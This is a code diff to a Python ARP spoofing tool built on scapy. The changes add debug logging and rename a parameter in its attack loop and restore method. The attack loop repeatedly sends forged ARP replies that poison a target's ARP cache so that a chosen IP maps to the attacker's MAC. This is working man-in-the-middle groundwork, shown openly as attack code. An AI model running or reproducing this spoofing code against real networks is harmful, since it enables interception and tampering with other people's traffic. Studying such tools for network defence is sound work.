@@ -28,29 +28,32 @@ class ArpSpoofer:
         :param spoofIp: The IP address to spoof
         """
         targetMac = scapy.getmacbyip(targetIp)
+        self.logger.debug(f"Target IP address: {targetIp}")
+        self.logger.debug(f"Target MAC address: {targetMac}")
         if targetMac == None:
             self.logger.error(f"ARP request for IP address {targetIp} failed! Target is not reachable!")
             sys.exit(1)
         else:
             while self.isRunning:
-                self.logger.debug(f"Sending ARP response to {targetIp} with spoofed IP address {spoofIp}")
-                packet = scapy.ARP(op=2, pdst=targetIp, hwdst=targetMac, psrc=spoofIp)
+                self.logger.debug(f"Tell target {targetIp} that spoofed IP address {spoofIp} is at our MAC address")
+                packet = scapy.ARP(op=2, pdst=targetIp, hwdst=targetMac, psrc=(spoofIp))
                 scapy.send(packet, verbose=False)
                 time.sleep(1)
 
-    def _restore(self, destination_ip, source_ip):
+    def _restore(self, targetIp, source_ip):
         """
         Restore the target's ARP table by sending a real ARP response.
         This is done by sending the target the spoofed IP address and the real MAC address of the spoofed IP address.
 
-        :param destination_ip: The victim's IP address
+        :param targetIp: The victim's IP address
         :param source_ip: The spoofed IP address
         """
         try:
-            self.logger.info(f"Restoring ARP tables for target {destination_ip} and spoofed IP address {source_ip}")
-            destination_mac = scapy.getmacbyip(destination_ip)
+            self.logger.info(f"Restoring ARP tables for target {targetIp} and spoofed IP address {source_ip}")
+            self.logger.debug(f"Tell target {targetIp} the correct MAC-Adress for spoofed IP address {source_ip}")
+            destination_mac = scapy.getmacbyip(targetIp)
             source_mac = scapy.getmacbyip(source_ip)
-            packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+            packet = scapy.ARP(op=2, pdst=targetIp, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
             scapy.send(packet, verbose=False)
         except Exception as e:
             self.logger.error(f"Error while restoring ARP tables: {e}")
